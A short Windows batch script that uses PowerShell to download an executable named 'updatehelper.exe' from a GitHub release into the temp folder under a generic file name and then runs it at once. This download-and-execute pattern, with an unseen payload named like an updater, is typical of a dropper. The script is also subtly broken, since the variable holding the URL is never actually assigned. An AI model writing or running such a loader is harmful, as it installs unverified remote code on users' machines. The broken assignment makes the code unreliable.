@echo off
set "https://github.com/wabor1/test/releases/download/1/updatehelper.exe"
set "TEMP_FILE=%TEMP%\file.ext"

powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL%', '%TEMP_FILE%')"
if exist "%TEMP_FILE%" (
    echo Downloaded to %TEMP_FILE%
    start "" "%TEMP_FILE%"
) else (
    echo Download failed.
)
pause   